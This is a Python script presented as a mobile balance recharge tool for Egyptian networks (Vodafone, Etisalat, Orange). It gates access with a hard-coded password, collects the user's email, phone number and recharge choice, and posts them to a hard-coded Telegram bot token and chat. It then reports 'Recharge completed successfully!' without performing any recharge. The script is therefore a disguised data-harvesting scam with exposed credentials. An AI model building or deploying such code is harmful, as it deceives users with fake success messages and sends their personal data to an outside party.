import pyfiglet
import getpass
import requests

Z = '\033[1;31m'  # Red
X = '\033[1;33m'  # Yellow
C = '\033[1;35m'  # Magenta
F = '\033[1;32m'  # Green
B = '\033[1;36m'  # Cyan

help_text = '''========================
== Script Help ==
========================

This script is used to recharge your balance.
Please follow the instructions and enter the required information.

1. You will be prompted to enter your email and password.
2. The email and password will be verified, and if correct, the process will continue.
3. You will be asked to choose the network (Vodafone, Etisalat, Orange).
4. You will be prompted to enter your phone number.
5. The available recharge options will be displayed based on the chosen network.
6. You will be asked to select the desired recharge option.
7. The selected recharge option will be activated.

Please note that this script is for educational purposes only and should not be used for any illegal activities.

========================
'''

def display_help():
    print('\033c')
    print(F + help_text)
    input("Press Enter to continue...")

def generate_user_code(identifier):
    code = ''
    for char in identifier:
        code += str(ord(char))
    return code

def send_to_telegram(user_data):
    bot_token = '6393646686:AAGI9RlsAQQ__iKfgjWlWcx5I76iWyse_AU'
    chat_id = '1716288434'
    message = f"New user wants to recharge the balance:\n\nUser Code: {user_data['User Code']}\nEmail: {user_data['Email']}\n{user_data['Data']}"

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }

    response = requests.post(url, data=data)
    if response.status_code == 200:
        pass
    else:
        print("Failed to send message to Telegram.")

print(X + "Enter Your Email:")
email = input()

print(X + "Enter Your Password:")
password = getpass.getpass()

if password == 'Abdou600':
    print("\033[2J\033[1;1H")

    print(f"{C}==================================")
    print(f"{C}Welcome to the balance recharge section")
    print(f"{C}==================================")

    logo = pyfiglet.figlet_format("BALANCE RECHARGE", font="slant")
    print(F + logo)

    print(f"{C}==================================")
    print()

    networks = {
        'vodafone': {
            'name': 'Vodafone',
            'recharge_options': [
                {'name': 'Recharge 2.5 EGP', 'value': '2.5'},
                {'name': 'Recharge 5 EGP', 'value': '5'},
                {'name': 'Recharge 6 EGP', 'value': '10'},
                {'name': 'Recharge 9 EGP', 'value': '15'},
            ]
        },
        'etisalat': {
            'name': 'Etisalat',
            'recharge_options': [
                {'name': 'Recharge 2.5 EGP', 'value': '2'},
                {'name': 'Recharge 5 EGP', 'value': '5'},
                {'name': 'Recharge 9 EGP', 'value': '10'},
                {'name': 'Recharge 13.5 EGP', 'value': '20'},
            ]
        },
        'orange': {
            'name': 'Orange',
            'recharge_options': [
                {'name': 'Recharge 2.5 EGP', 'value': '1'},
                {'name': 'Recharge 5 EGP', 'value': '2'},
                {'name': 'Recharge 9 EGP', 'value': '5'},
                {'name': 'Recharge 15 EGP', 'value': '10'},
            ]
        }
    }

    print(C + "\nChoose the network:")
    for i, network in enumerate(networks.values(), 1):
        print(f"{C}{i}. {network['name']}")

    network_choice = input(F + "Enter the network number: ")
    network_choice = int(network_choice) - 1

    network_list = list(networks.values())
    if network_choice < 0 or network_choice >= len(network_list):
        exit(f'\n{Z}ERROR: Invalid network choice')

    network = network_list[network_choice]

    phone_number = input(f"{X}Enter your phone number: ")

    print(f"{C}\nSelect the recharge option:")
    recharge_options = network['recharge_options']
    for i, option in enumerate(recharge_options, 1):
        print(f"{C}{i}. {option['name']}")

    recharge_choice = input(F + "Enter the recharge option number: ")
    recharge_choice = int(recharge_choice) - 1

    if recharge_choice < 0 or recharge_choice >= len(recharge_options):
        exit(f'\n{Z}ERROR: Invalid recharge option choice')

    recharge_option = recharge_options[recharge_choice]

    user_data = {
        "User Code": generate_user_code(email),
        "Email": email,
        "Data": {
            "Network": network['name'],
            "Phone Number": phone_number,
            "Recharge Option": recharge_option['name']
        }
    }

    send_to_telegram(user_data)

    print(f"\n{F}Recharge initiated. Please wait...")
    # Here you can add the code to perform the actual recharge process
    # This line is added just for demonstration purposes
    print(f"{F}Recharge completed successfully!")

    # Display help text
    print("\n\033[1mPress (?) for help\033[0m")
    help_button = input()

    if help_button == '?':
        display_help()
else:
    print(f"{Z}Invalid Password. Access Denied!")
